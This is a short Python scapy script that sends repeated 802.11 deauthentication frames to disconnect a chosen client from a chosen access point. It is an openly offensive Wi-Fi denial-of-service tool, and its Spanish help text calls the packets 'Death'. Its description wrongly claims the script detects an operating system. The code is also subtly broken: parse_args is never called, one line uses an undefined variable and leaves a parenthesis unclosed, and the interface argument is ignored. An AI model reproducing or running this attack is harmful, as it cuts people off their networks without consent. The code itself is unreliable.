#!/usr/bin/python

from scapy.all import *


import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para detectar el OS de un sistema")
parser.add_argument('mV', help="MAC de usuario a desautenticar")
parser.add_argument('mG', help="MAC del acces point")
parser.add_argument('I', help="La interfaz de red")
parser.add_argument('n', help="Numero de paquetes Death")

args = parser.parse_args

mV  = args.mV
mG  = args.mG
I   = args.I
n  = args.n

request = RadioTap()/Dot11( type=0,subtype=12,addr1=mV,addr2=mG,addr3=m/Dot11Deauth(reason=7)

for n in range(int(n)):
    sendp(request)
    print 'Desautenticando  ' + mV + 'Conectado a ' + mG + ' por la interfaz ' + I 
